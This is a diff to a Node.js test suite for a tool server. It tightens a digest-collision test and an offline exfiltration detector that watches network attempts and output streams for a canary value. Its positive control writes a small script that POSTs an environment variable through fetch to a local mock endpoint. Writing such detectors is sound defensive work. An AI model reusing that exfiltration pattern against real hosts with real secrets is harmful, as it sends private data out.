@@ -8,8 +8,18 @@
 //   * the offline exfiltration channel can actually observe a canary that moves.
 
 import { spawn } from "node:child_process";
+import { createHash } from "node:crypto";
 import { createServer } from "node:http";
-import { mkdtempSync, mkdirSync, writeFileSync, rmSync, realpathSync } from "node:fs";
+import {
+  mkdtempSync,
+  mkdirSync,
+  writeFileSync,
+  rmSync,
+  existsSync,
+  readdirSync,
+  readFileSync,
+  realpathSync,
+} from "node:fs";
 import { tmpdir } from "node:os";
 import { join, dirname, sep } from "node:path";
 import { fileURLToPath } from "node:url";
@@ -235,19 +245,33 @@ test("a data: URL resolution is a violation, never a builtin", async () => {
   });
 });
 
-test("mutation: treeDigest's record encoding is unambiguous — one mimicking file vs two files differ", async () => {
-  // With raw concatenation, a single file whose CONTENTS contain bytes shaped like a
-  // following record could collide with a tree where that record is a real second file.
-  // JSON-per-entry encoding (with the file's own sha256, not its bytes) kills that.
+test("mutation: treeDigest's record encoding is unambiguous — trees that COLLIDE under raw concatenation differ", async () => {
+  // The defect class: an encoding that concatenates `F <path> <bytes>` records lets one file
+  // whose contents embed a record collide with a tree where that record is a real second
+  // file. The positive control below demonstrates the collision against that defective
+  // encoding — so reverting treeDigest to it fails THIS test, not just a hypothetical
+  // (review round 1: the previous fixture's fake record did not equal the old encoding's
+  // real record, so the mutation was vacuous).
   await withTempDir((dir) => {
     const a = join(dir, "a");
     const b = join(dir, "b");
     mkdirSync(a);
     mkdirSync(b);
-    const mimic = '\n["F","y.txt","' + "0".repeat(64) + '"]';
-    writeFileSync(join(a, "x.txt"), `payload${mimic}`);
+    writeFileSync(join(a, "x.txt"), "payload\nF y.txt different");
     writeFileSync(join(b, "x.txt"), "payload");
     writeFileSync(join(b, "y.txt"), "different");
+    const rawConcatDigest = (root) => {
+      const h = createHash("sha256");
+      for (const name of readdirSync(root).sort()) {
+        h.update(`F ${name} ${readFileSync(join(root, name))}\n`);
+      }
+      return h.digest("hex");
+    };
+    assert.equal(
+      rawConcatDigest(a),
+      rawConcatDigest(b),
+      "fixture no longer reproduces the raw-concatenation collision — the control is dead",
+    );
     assert.notEqual(treeDigest(a), treeDigest(b));
   });
 });
@@ -268,8 +292,16 @@ test("treeDigest is order-stable and byte-sensitive", async () => {
 });
 
 // --- offline exfiltration observation (§2's replacement for the credential canary) ---------
+//
+// The asserted claim, stated precisely (review round 1): during a full probe exchange the
+// candidate makes NO egress attempt through Node's network APIs (net/dgram/dns/fetch — the
+// net-observe.mjs preload records every attempt), and the canary value appears in neither
+// stdio stream. Native-addon egress is outside this observer's reach and is precluded
+// separately by the supply-chain gate (no native-build machinery in either closure). The
+// positive control moves a canary through the SAME preload, proving the channel records.
 
 const CANARY = "spendbar-canary-value-000000";
+const NET_OBSERVE = join(HERE, "net-observe.mjs");
 
 function startMock() {
   return new Promise((resolve) => {
@@ -283,85 +315,114 @@ function startMock() {
       });
     });
     server.listen(0, "127.0.0.1", () => {
-      resolve({ url: `http://127.0.0.1:${server.address().port}`, hits, close: () => server.close() });
+      resolve({
+        url: `http://127.0.0.1:${server.address().port}`,
+        hits,
+        close: () => new Promise((done) => server.close(done)),
+      });
     });
   });
 }
 
-test("a full probe exchange moves no canary: not to the local endpoint, not into any stream", async () => {
-  // Scope, stated honestly: this observes the local endpoint (including proxy-respecting
-  // egress pointed at it) and the process's own streams. It cannot firewall a raw socket to
-  // an arbitrary host; that limit is why the sanitized manifest never carries env VALUES and
-  // why real-client runs get only the exact allowlisted environment in the first place.
+/** Await 'close' under a deadline; on deadline, SIGKILL and report timedOut — the CALLER
+ *  decides that a timeout fails the test. Never treats a kill as a clean exit. */
+function awaitClose(child, timeoutMs) {
+  return new Promise((resolve) => {
+    let timedOut = false;
+    const timer = setTimeout(() => {
+      timedOut = true;
+      child.kill("SIGKILL");
+    }, timeoutMs);
+    child.once("close", (code, signal) => {
+      clearTimeout(timer);
+      resolve({ code, signal, timedOut });
+    });
+  });
+}
+
+const netAttempts = (logPath) =>
+  existsSync(logPath)
+    ? readFileSync(logPath, "utf8").split("\n").filter((l) => l.trim() !== "")
+    : [];
+
+test("a full probe exchange makes no Node-API egress attempt and moves no canary into any stream", async () => {
   const mock = await startMock();
   try {
-    for (const candidate of ["v1", "v2"]) {
-      const { root, resolveLog } = roots[candidate];
-      const env = buildServerEnv({
-        resolveLog,
-        extra: {
-          SPENDBAR_TEST_CANARY: CANARY,
-          HTTP_PROXY: mock.url,
-          HTTPS_PROXY: mock.url,
-          ALL_PROXY: mock.url,
-        },
-      });
-      const child = spawn(process.execPath, ["server.mjs"], { cwd: root, env, stdio: ["pipe", "pipe", "pipe"] });
-      let out = "";
-      let err = "";
-      child.stdout.on("data", (d) => (out += d));
-      child.stderr.on("data", (d) => (err += d));
-      child.stdin.write(
-        JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "exfil-test", version: "0" } } }) + "\n",
-      );
-      child.stdin.write(JSON.stringify({ jsonrpc: "2.0", method: "notifications/initialized" }) + "\n");
-      child.stdin.write(
-        JSON.stringify({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "spendbar_probe", arguments: { nonce: "exfil" } } }) + "\n",
-      );
-      await new Promise((resolve) => setTimeout(resolve, 2000));
-      child.stdin.end();
-      await new Promise((resolve) => {
-        const t = setTimeout(() => {
-          child.kill("SIGKILL");
-          resolve();
-        }, 5000);
-        child.on("exit", () => {
-          clearTimeout(t);
-          resolve();
+    await withTempDir(async (dir) => {
+      for (const candidate of ["v1", "v2"]) {
+        const { root, resolveLog } = roots[candidate];
+        const netLog = join(dir, `net-${candidate}.ndjson`);
+        const env = buildServerEnv({
+          resolveLog,
+          extra: { SPENDBAR_TEST_CANARY: CANARY, SPENDBAR_NET_LOG: netLog },
         });
-      });
-      assert.ok(out.includes('"exfil"'), `${candidate}: exchange did not complete`);
-      assert.ok(!out.includes(CANARY), `${candidate}: canary appeared on stdout`);
-      assert.ok(!err.includes(CANARY), `${candidate}: canary appeared on stderr`);
-    }
+        const child = spawn(process.execPath, ["--import", NET_OBSERVE, "server.mjs"], {
+          cwd: root,
+          env,
+          stdio: ["pipe", "pipe", "pipe"],
+        });
+        let out = "";
+        let err = "";
+        child.stdout.on("data", (d) => (out += d));
+        child.stderr.on("data", (d) => (err += d));
+        child.stdin.write(
+          JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "exfil-test", version: "0" } } }) + "\n",
+        );
+        child.stdin.write(JSON.stringify({ jsonrpc: "2.0", method: "notifications/initialized" }) + "\n");
+        child.stdin.write(
+          JSON.stringify({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "spendbar_probe", arguments: { nonce: "exfil" } } }) + "\n",
+        );
+        await new Promise((resolve) => setTimeout(resolve, 2000));
+        child.stdin.end();
+        // A timeout or unclean exit FAILS: a child SIGKILLed mid-outbound-request must never
+        // read as "no egress happened" (review round 1).
+        const closed = await awaitClose(child, 5000);
+        assert.equal(closed.timedOut, false, `${candidate}: server did not exit after client EOF`);
+        assert.equal(closed.code, 0, `${candidate}: server exited ${closed.code}/${closed.signal}, expected 0`);
+        assert.ok(out.includes('"exfil"'), `${candidate}: exchange did not complete`);
+        assert.ok(!out.includes(CANARY), `${candidate}: canary appeared on stdout`);
+        assert.ok(!err.includes(CANARY), `${candidate}: canary appeared on stderr`);
+        assert.deepEqual(
+          netAttempts(netLog),
+          [],
+          `${candidate}: the server attempted network egress`,
+        );
+      }
+    });
     assert.equal(mock.hits.length, 0, `local endpoint was contacted: ${JSON.stringify(mock.hits)}`);
   } finally {
-    mock.close();
+    await mock.close();
   }
 });
 
-test("positive control: a process that DOES move the canary is observed at the endpoint", async () => {
-  // Without this, the zero-hits assertion above could pass because the channel is deaf.
+test("positive control: a child that DOES move the canary is recorded by the same preload and endpoint", async () => {
+  // Without this, empty attempt logs above could mean the observer never armed. The control
+  // uses the identical --import interception path AND proves real delivery at the endpoint.
   const mock = await startMock();
   try {
     await withTempDir(async (dir) => {
       const script = join(dir, "exfiltrate.mjs");
+      const netLog = join(dir, "net-positive.ndjson");
       writeFileSync(
         script,
         'await fetch(process.env.SPENDBAR_EXFIL_URL, { method: "POST", body: process.env.SPENDBAR_TEST_CANARY });\n',
       );
-      const child = spawn(process.execPath, [script], {
-        env: { SPENDBAR_TEST_CANARY: CANARY, SPENDBAR_EXFIL_URL: mock.url },
+      const child = spawn(process.execPath, ["--import", NET_OBSERVE, script], {
+        env: { SPENDBAR_TEST_CANARY: CANARY, SPENDBAR_EXFIL_URL: mock.url, SPENDBAR_NET_LOG: netLog },
         stdio: ["ignore", "ignore", "pipe"],
       });
       let stderr = "";
       child.stderr.on("data", (d) => (stderr += d));
-      const code = await new Promise((resolve) => child.on("exit", resolve));
-      assert.equal(code, 0, `positive-control child failed: ${stderr}`);
+      const closed = await awaitClose(child, 10_000);
+      assert.equal(closed.timedOut, false, "positive-control child hung");
+      assert.equal(closed.code, 0, `positive-control child failed (${closed.code}): ${stderr}`);
+      const attempts = netAttempts(netLog);
+      assert.ok(attempts.length > 0, "the preload recorded no attempt for a child that did egress");
+      assert.ok(attempts.some((l) => l.includes('"fetch"')), "the fetch entry point was not recorded");
     });
     assert.equal(mock.hits.length, 1);
     assert.ok(mock.hits[0].body.includes(CANARY), "the endpoint saw a request but not the canary");
   } finally {
-    mock.close();
+    await mock.close();
   }
 });
